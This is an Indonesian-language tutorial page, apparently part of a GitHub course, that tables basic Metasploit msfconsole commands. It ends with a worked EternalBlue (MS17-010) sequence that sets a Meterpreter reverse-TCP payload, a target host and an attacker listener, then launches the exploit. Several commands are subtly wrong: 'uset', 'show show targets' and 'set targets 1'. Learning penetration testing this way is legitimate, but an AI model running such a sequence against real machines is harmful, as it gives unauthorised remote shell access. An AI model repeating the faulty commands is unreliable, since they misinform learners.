<p align="left"><b>Sebelumnya</b>: <a href="https://github.com/fixploit03/Belajar-Metasploit/blob/main/resource/Antarmuka%20Metasploit%20Framework.md">Antarmuka Metasploit Framework</a></p>

# Perintah Dasar MSFconsole

## Perintah Navigasi dan Bantuan

| Perintah | Deskripsi |
|:--:|:--:|
| `help` | Menampilkan daftar perintah yang tersedia |
| `help [perintah]` | Menampilkan bantuan untuk perintah tertentu |
| `back` | Kembali dari konteks modul ke prompt utama |
| `exit` | Keluar dari MSFconsole |
| `version` | Menampilkan versi Metasploit Framework |

## Perintah Pencarian dan Informasi

| Perintah | Deskripsi |
|:--:|:--:|
| `search [kata kunci]` | Mencari modul berdasarkan kata kunci |
| `info [modul]` | Menampilkan informasi tentang modul tertentu |
| `show exploits` | Menampilkan semua modul exploit yang tersedia |
| `show auxiliary` | Menampilkan semua modul auxiliary yang tersedia |
| `show payloads` | Menampilkan semua payload yang tersedia |
| `show options` | Menampilkan opsi yang tersedia untuk modul yang dipilih |

## Penggunaan Modul

| Perintah | Deskripsi |
|:--:|:--:|
| `use [path modul]` | Memilih modul untuk digunakan |
| `set [opsi] [nilai]` | Mengatur nilai untuk opsi tertentu |
| `setg [opsi] [nilai]` | Mengatur nilai global untuk opsi tertentu |
| `uset [opsi]` | Menghapus nilai opsi |
| `check` | Memeriksa apakah target rentan (tidak semua modul mendukung) |
| `run` atau `exploit` | Menjalankan modul yang dipilih |

## Contoh Penggunaan Dasar

### Mencari Modul

```
search type:exploit platform:windows remote
```

Untuk pencarian lebih spesifik

```
search cve:2021 type:exploit
```

### Menggunakan Modul

```
# Menggunakan modul EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue

# Menampilkan opsi yang ada di modul ms17_010_eternalblue
show options

# Menggunakan payload windows/x64/meterpreter/reverse_tcp
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Setting alamat IP target yang ingin dieksploitasi
set RHOSTS 192.168.1.10

# Setting port SMB dari target (default: 445)
set RPORT 445

# Setting alamat IP lokal (attacker) yang akan menerima koneksi reverse
set LHOST 192.168.1.5

# Setting port lokal untuk koneksi reverse
set LPORT 4444

# Menampilkan daftar target yang didukung oleh modul
show show targets

# Memilih target yang sesuai dari daftar (misal: 1)
set targets 1

# Menjalankan eksploitasi
exploit
```

## Fitur Tambahan MSFconsole

### Mengelola Sesi 

| Perintah | Deskripsi |
|:--:|:--:|
| `sessions -l` | Menampilkan semua sesi yang aktif |
| `sessions -i [id]` | Berinteraksi dengan sesi tertentu |
| `sessions -k [id]` | Menghentikan sesi tertentu |

### Manajemen Database

| Perintah | Deskripsi |
|:--:|:--:|
| `db_status` | Memeriksa status koneksi database |
| `workspace` | Menampilkan dan mengelola workspace | 
| `hosts` | Menampilkan host yang tersimpan di database |
| `services` | Menampilkan layanan yang tersimpan di database |
| `vulns` | Menampilkan kerentanan yang terdeteksi |

Itu dia perintah dasar MSFconsole.

<p align="right"><b>Selanjutnya</b>: <a href="https://github.com/fixploit03/Belajar-Metasploit/blob/main/resource/Jenis-Jenis%20Modul%20di%20Metasploit%20Framework.md">Jenis-Jenis Modul di Metasploit Framework</a></p>
